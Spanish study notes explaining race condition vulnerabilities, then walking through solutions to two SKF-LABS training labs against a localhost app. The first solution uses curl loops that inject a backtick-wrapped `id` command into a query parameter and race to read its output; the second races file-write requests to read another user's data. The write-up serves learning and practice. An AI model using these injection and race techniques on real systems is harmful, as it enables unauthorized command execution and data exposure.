___________________________
Las **condiciones de carrera** (también conocidas como **Race Condition**) son un tipo de vulnerabilidad que puede ocurrir en sistemas informáticos donde dos o más procesos o hilos de ejecución compiten por los mismos recursos sin que haya un mecanismo adecuado de sincronización para controlar el acceso a los mismos.

Esto significa que si dos procesos intentan acceder a un mismo recurso compartido al mismo tiempo, puede ocurrir que la salida de uno o ambos procesos sea impredecible, o incluso que se produzca un comportamiento no deseado en el sistema.

Los atacantes pueden aprovecharse de las condiciones de carrera para llevar a cabo ataques de denegación de servicio (**DoS**), sobreescribir datos críticos, obtener acceso no autorizado a recursos, o incluso ejecutar código malicioso en el sistema.

Por ejemplo, supongamos que dos procesos intentan acceder a un archivo al mismo tiempo: uno para leer y el otro para escribir. Si no hay un mecanismo adecuado para sincronizar el acceso al archivo, puede ocurrir que el proceso de lectura lea datos incorrectos del archivo, o que el proceso de escritura sobrescriba datos importantes que necesitan ser preservados.

El impacto de las condiciones de carrera en la seguridad depende de la naturaleza del recurso compartido y del tipo de ataque que se pueda llevar a cabo. En general, las condiciones de carrera pueden permitir a los atacantes acceder a recursos críticos, modificar datos importantes, o incluso tomar el control completo del sistema. Por lo tanto, es importante que los desarrolladores y administradores de sistemas tomen medidas para evitar y mitigar las condiciones de carrera en sus sistemas.
_______________

[SKF-LABS Race Condition](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition)
[SKF-LABS Race Condition 2](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition-file-write)

Solución LAB 1

Se descubre que en un campo es posible escribir un comando de la siguiente manera **\`id\`**, pero la APP lo borra instantáneamente por incluir caracteres especiales podemos intentar leer el archivo antes que sea borrado realizando múltiples solicitudes

```bash
# Terminal 1 intentamos ver el resultado del comando haciendo un bucle infinito
while true; do curl -s X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -vE "hola|Important|Default User"; done
```

```bash
# Terminal 2 intentamos colar el comando en un bucle infinito
while true; do curl -s X GET 'http://localhost:5000/?person=`id`&action=validate';
```

![[Pasted image 20231011162259.png]]
Si todo va bien finalmente en algún punto lograremos ver el comando inyectado

Solución LAB 2

Es un APP que permite colocar un parámetro y te descarga un archivo con el contenido del parámetro, podemos probar generando 2 solicitudes a la vez para ver si podemos ver datos que no colocamos nosotros

```bash
while true; do curl -s X GET "http://localhost:5000/hola" | grep -v "hola"; done
```

````bash
while true; do curl -s X GET "http://localhost:5000/testing" | grep -v "testing"; done
````
Podemos ver el archivo de _**testing**_ siendo que colocamos _**hola**_

![[Pasted image 20231011162901.png]]
_______________________________________________________
